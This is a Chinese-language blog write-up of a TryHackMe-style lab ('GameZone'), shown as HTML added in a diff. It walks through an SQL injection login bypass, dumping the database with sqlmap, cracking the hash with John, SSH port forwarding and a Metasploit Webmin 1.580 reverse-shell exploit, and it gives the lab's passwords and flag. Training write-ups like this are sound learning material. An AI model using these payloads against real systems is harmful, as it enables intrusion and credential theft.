@@ -1,0 +1,337 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Offensive Pentesting-GameZone | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Offensive Pentesting-GameZoneDeploy the vulnerable machine拿到靶机 先扫端口  只是开启了22端口的ssh服务和80端口的web服务  访问一下网站  What is the name of the large cartoon avatar holding a sniper on the forum? Agent 47  问的是背景中这个拿">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Offensive Pentesting-GameZone">
+<meta property="og:url" content="http://w3nx1z1.github.io/posts/dda9dc81/index.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="Offensive Pentesting-GameZoneDeploy the vulnerable machine拿到靶机 先扫端口  只是开启了22端口的ssh服务和80端口的web服务  访问一下网站  What is the name of the large cartoon avatar holding a sniper on the forum? Agent 47  问的是背景中这个拿">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2024-11-26T09:04:48.797Z">
+<meta property="article:modified_time" content="2025-02-14T08:30:17.423Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/posts/dda9dc81/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="TndEWE7xyUxTUkbHXgpxFtutY3_VE4qYCNq6-qHt11I"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Offensive Pentesting-GameZone',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-14 16:30:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Offensive Pentesting-GameZone</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-26T09:04:48.797Z" title="发表于 2024-11-26 17:04:48">2024-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-14T08:30:17.423Z" title="更新于 2025-02-14 16:30:17">2025-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Offensive Pentesting-GameZone"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Offensive-Pentesting-GameZone"><a href="#Offensive-Pentesting-GameZone" class="headerlink" title="Offensive Pentesting-GameZone"></a>Offensive Pentesting-GameZone</h1><h2 id="Deploy-the-vulnerable-machine"><a href="#Deploy-the-vulnerable-machine" class="headerlink" title="Deploy the vulnerable machine"></a>Deploy the vulnerable machine</h2><p>拿到靶机 先扫端口</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172254919.png" alt="image-20241117225437774"></p>
+<p>只是开启了22端口的ssh服务和80端口的web服务</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172301781.png" alt="image-20241117230136420"></p>
+<p>访问一下网站</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172310906.png" alt="image-20241117231042730"></p>
+<p>What is the name of the large cartoon avatar holding a sniper on the forum?</p>
+<pre><code>Agent 47
+</code></pre>
+<p>问的是背景中这个拿着狙击枪的角色是 我们把这张图单独保存出来 百度识图一下得知是《杀手》游戏中的主角</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172314464.png" alt="image-20241117231439353"></p>
+<h2 id="Obtain-access-via-SQLi"><a href="#Obtain-access-via-SQLi" class="headerlink" title="Obtain access via SQLi"></a>Obtain access via SQLi</h2><p>SQL 是一种用于在数据库中存储、编辑和检索数据的标准语言。查询可能如下所示：</p>
+<pre><code>SELECT * FROM users WHERE username = :username AND password := password
+</code></pre>
+<p>在我们的 GameZone 机器中，当您尝试登录时，它将从您的用户名和密码中获取您输入的值，然后将它们直接插入到上面的查询中。如果查询找到数据，您将被允许登录，否则它将显示一条错误消息。</p>
+<p>这是一个潜在的漏洞位置，因为您可以将用户名输入为另一个 SQL 查询。这将写入、放置和执行查询。</p>
+<p>让我们使用上面学到的知识来操作查询并在没有任何合法凭证的情况下登录。</p>
+<p>如果我们的用户名是 admin，密码是： <code>&#39; or 1=1 -- -</code>它会将其插入到查询中并验证我们的会话。</p>
+<p>现在在 Web 服务器上执行的 SQL 查询如下所示：</p>
+<pre><code>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- -
+</code></pre>
+<p>我们作为密码输入的额外 SQL 更改了上述查询以中断初始查询并继续（与管理员用户一起）如果 1&#x3D;&#x3D;1，则注释查询的其余部分以阻止它中断。</p>
+<p>完成</p>
+<p>GameZone 在数据库中没有管理员用户，但是您仍然可以使用我们在上一个问题中使用的输入密码数据在不知道任何凭据的情况下登录。</p>
+<p>使用 <code>&#39; or 1=1 -- -</code> 作为您的用户名，并将密码留空</p>
+<p>登录后，您将重定向到哪个页面？</p>
+<pre><code>portal.php
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135932.png" alt="image-20241118113525822"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135714.png" alt="image-20241118113538644"></p>
+<h2 id="Using-SQLMap"><a href="#Using-SQLMap" class="headerlink" title="Using SQLMap"></a>Using SQLMap</h2><p>重定向到的这个页面是一个游戏评论查询的功能 我们可以在这个页面上进行sql注入 这里直接使用sqlmap</p>
+<p>先用burpsuite把请求包拦一下 将请求包的内容保存到requests.txt中</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181152184.png" alt="image-20241118115229127"></p>
+<pre><code>sqlmap -r requests.txt --dbms=mysql --dump
+</code></pre>
+<p>使用–dbms指定数据库的类型 –dump直接转储数据库表项,查询字段值 </p>
+<p>输出了db数据库中的两个表</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154640.png" alt="image-20241118115453573"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154331.png" alt="image-20241118115457279"></p>
+<p>在 users 表中，哈希密码是什么？</p>
+<pre><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+</code></pre>
+<p>与哈希密码关联的用户名是什么？</p>
+<pre><code>agent47
+</code></pre>
+<p>另一个表名是什么？</p>
+<pre><code>post
+</code></pre>
+<h2 id="Cracking-a-password-with-JohnTheRipper"><a href="#Cracking-a-password-with-JohnTheRipper" class="headerlink" title="Cracking a password with JohnTheRipper"></a>Cracking a password with JohnTheRipper</h2><p>下一步我们使用john来爆破密码</p>
+<pre><code>john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181157277.png" alt="image-20241118115759212"></p>
+<p>拿到密码明文是</p>
+<pre><code>videogamer124
+</code></pre>
+<p>有了用户名和密码 我们可以使用ssh远程连接 获取agent47用户的shell 并拿到用户目录下的flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181159788.png" alt="image-20241118115914731"></p>
+<p>什么是用户标志？</p>
+<pre><code>649ac17b1480ac13ef1e4fa579dac95c
+</code></pre>
+<h2 id="Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务"><a href="#Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务" class="headerlink" title="Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)"></a>Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)</h2><p>反向 SSH 端口转发将远程服务器主机上的给定端口转发到本地端的给定主机和端口。</p>
+<p><strong>-L</strong> 是本地隧道 （YOU &lt;– CLIENT）。如果站点被阻止，您可以将流量转发到您拥有的服务器并查看它。例如，如果你在本地访问远程服务器开启的网页被拒绝时，您可以执行</p>
+<pre><code>ssh -L 9000:imgur.com:80 user@example.com
+</code></pre>
+<p>转到您计算机上的 localhost:9000，将使用您的其他服务器加载这个远程服务器的服务流量。</p>
+<p><strong>-R</strong> 是远程隧道 （YOU –&gt; CLIENT）。您将流量转发到其他服务器供其他人查看。与上面的示例类似，但是相反</p>
+<pre><code>我们将使用一个名为 ss 的工具来调查主机上运行的sockets
+
+如果我们运行 ss -tulpn，它会告诉我们正在运行哪些sockets连接
+</code></pre>
+<table>
+<thead>
+<tr>
+<th><strong>Argument</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-t</td>
+<td>Display TCP sockets</td>
+</tr>
+<tr>
+<td>-u</td>
+<td>Display UDP sockets</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>Displays only listening sockets</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>Shows the process using the socket</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>Doesn’t resolve service names</td>
+</tr>
+</tbody></table>
+<p>现在我们可以在靶机中运行一下这个命令 查看一下有多少TCP的sockets在运行</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181648577.png" alt="image-20241118164804514"></p>
+<p>How many TCP sockets are running?</p>
+<pre><code>5
+</code></pre>
+<p>我们可以看到，运行在端口 10000 上的服务被防火墙规则从外部阻止了（我们可以从 IPtable 列表中看到这一点）。但是，使用 SSH 隧道，我们可以将端口公开给我们（本地）</p>
+<pre><code>sudo iptables -L -n -v
+</code></pre>
+<p>在本地 我们运行 这样10.10.137.213开放的端口10000的服务就会转发到我们本地的10000端口上</p>
+<pre><code>ssh -L 10000:localhost:10000 agent47@10.10.137.213
+</code></pre>
+<p>现在访问<code>localhost:10000</code> 就可以访问到这个web服务 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181657049.png" alt="image-20241118165732947"></p>
+<p>尝试发现 网站的登陆密码也是agent47&#x2F;videogamer124 成功登陆后台</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181658156.png" alt="image-20241118165808082"></p>
+<p>What is the name of the exposed CMS?</p>
+<pre><code>Webmin
+</code></pre>
+<p>What is the CMS version?</p>
+<pre><code>1.580
+</code></pre>
+<h2 id="Privilege-Escalation-with-Metasploit"><a href="#Privilege-Escalation-with-Metasploit" class="headerlink" title="Privilege Escalation with Metasploit"></a>Privilege Escalation with Metasploit</h2><p>有了cms的版本 我们直接使用msfconsole来提权 这里就直接使用第一个payload来自动提权</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181659845.png" alt="image-20241118165954787"></p>
+<p>需要提前设置的条件有</p>
+<pre><code>use 0
+set payload cmd/unix/reverse
+set RHOSTS localhost
+set RPOST 10000
+set PASSWORD videogamer124
+set USERNAME agent47
+set LHOST 10.11.114.143
+set ssl false
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181700941.png" alt="image-20241118170035861"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181707215.png" alt="image-20241118170727069"></p>
+<p>已经创建了一个session会话 直接打开</p>
+<pre><code>sessions -l
+sessions 1
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181708778.png" alt="image-20241118170859673"></p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.sql注入重定向</p>
+<p>2.sqlmap注出数据库中的账密信息</p>
+<p>3.john破解密码哈希</p>
+<p>4.反向ssh隧道端口转发</p>
+<p>5.Webmin 1.580漏洞 msfconsole提权</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/posts/dda9dc81/">http://w3nx1z1.github.io/posts/dda9dc81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/dea42128/" title="Offensive Pentesting-DailyBugle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Offensive Pentesting-DailyBugle</div></div></a></div><div class="next-post pull-right"><a href="/posts/77f3502a/" title="Offensive Pentesting-Kenobi"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Offensive Pentesting-Kenobi</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3bc2e38b/" title="Offensive Pentesting-Alfred"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">Offensive Pentesting-Alfred</div></div></a></div><div><a href="/posts/dea42128/" title="Offensive Pentesting-DailyBugle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-DailyBugle</div></div></a></div><div><a href="/posts/3e5876b/" title="Offensive Pentesting-Overpass2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-11</div><div class="title">Offensive Pentesting-Overpass2</div></div></a></div><div><a href="/posts/34fc8f4b/" title="Offensive Pentesting-Steel Mountain"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">Offensive Pentesting-Steel Mountain</div></div></a></div><div><a href="/posts/c70d91b2/" title="Offensive Pentesting-Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-Skynet</div></div></a></div><div><a href="/posts/77f3502a/" title="Offensive Pentesting-Kenobi"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-Kenobi</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="post-series"><h3>thm学习笔记-系列：</h3><li><a class="title" href="/posts/3e5876b/" title="Offensive Pentesting-Overpass2">Offensive Pentesting-Overpass2</a></li><li><a class="title" href="/posts/3bc2e38b/" title="Offensive Pentesting-Alfred">Offensive Pentesting-Alfred</a></li><li><a class="title" href="/posts/34fc8f4b/" title="Offensive Pentesting-Steel Mountain">Offensive Pentesting-Steel Mountain</a></li><li><a class="title" href="/posts/dea42128/" title="Offensive Pentesting-DailyBugle">Offensive Pentesting-DailyBugle</a></li><li><a class="title" href="/posts/dda9dc81/" title="Offensive Pentesting-GameZone">Offensive Pentesting-GameZone</a></li><li><a class="title" href="/posts/77f3502a/" title="Offensive Pentesting-Kenobi">Offensive Pentesting-Kenobi</a></li><li><a class="title" href="/posts/c70d91b2/" title="Offensive Pentesting-Skynet">Offensive Pentesting-Skynet</a></li><li><a class="title" href="/posts/ca758c20/" title="Offensive Pentesting-Vulnversity">Offensive Pentesting-Vulnversity</a></li></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Offensive-Pentesting-GameZone"><span class="toc-text">Offensive Pentesting-GameZone</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Deploy-the-vulnerable-machine"><span class="toc-text">Deploy the vulnerable machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtain-access-via-SQLi"><span class="toc-text">Obtain access via SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-SQLMap"><span class="toc-text">Using SQLMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-a-password-with-JohnTheRipper"><span class="toc-text">Cracking a password with JohnTheRipper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exposing-services-with-reverse-SSH-tunnels-%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91-SSH-%E9%9A%A7%E9%81%93%E5%85%AC%E5%BC%80%E6%9C%8D%E5%8A%A1"><span class="toc-text">Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-with-Metasploit"><span class="toc-text">Privilege Escalation with Metasploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-text">考点</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/75d05e45/" title="对博客进行SEO优化">对博客进行SEO优化</a><time datetime="2025-02-14T08:41:37.455Z" title="发表于 2025-02-14 16:41:37">2025-02-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6f5a3cd/" title="2025启航杯wp">2025启航杯wp</a><time datetime="2025-01-25T15:56:54.364Z" title="发表于 2025-01-25 23:56:54">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2f21d3bc/" title="2025龙信考核比武">2025龙信考核比武</a><time datetime="2025-01-11T01:20:22.398Z" title="发表于 2025-01-11 09:20:22">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/67db48b9/" title="2024冀信杯决赛">2024冀信杯决赛</a><time datetime="2025-01-10T16:54:11.458Z" title="发表于 2025-01-11 00:54:11">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5b3dd75d/" title="DASCTF 2024最后一战 | Misc">DASCTF 2024最后一战 | Misc</a><time datetime="2025-01-08T10:00:09.647Z" title="发表于 2025-01-08 18:00:09">2025-01-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script 